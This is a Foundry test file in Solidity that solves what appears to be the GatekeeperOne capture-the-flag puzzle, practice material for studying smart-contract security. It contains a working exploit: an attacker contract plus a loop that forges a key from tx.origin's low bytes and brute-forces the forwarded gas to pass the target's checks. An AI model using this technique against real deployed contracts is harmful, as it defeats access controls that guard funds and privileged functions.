// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GateKeeperOne} from "../src/GateKeeperOne.sol";

contract GateKeeperOneAttacker {
    function attack(GateKeeperOne target, bytes8 key, uint256 gasToSend) external returns (bool) {
        return target.enter{gas: gasToSend}(key);
    }
}

contract GateKeeperOneTest is Test {
    GateKeeperOne public gatekeeper;
    GateKeeperOneAttacker public attacker;

    function setUp() public {
        gatekeeper = new GateKeeperOne();
        attacker = new GateKeeperOneAttacker();
    }

    function test_EnterGateKeeper() public {
        // Build the 8-byte (64-bits) key matching tx.origin's lowest 2 bytes
        uint16 originLow16 = uint16(uint160(tx.origin));
        bytes8 key = bytes8(uint64(0x1000000000000000) | uint64(originLow16));

        // Brute force the exact gas offset needed so gasLeft() % 8191 == 0 at gateTwo
        uint256 baseGas = 8191 * 10;
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToSend = baseGas + i;
            try attacker.attack(gatekeeper, key, gasToSend) returns (bool) {
                assertEq(gatekeeper.entrant(), tx.origin);
                return;
            } catch {}
        }
        revert("Did not find matching gas offset");
    }
}
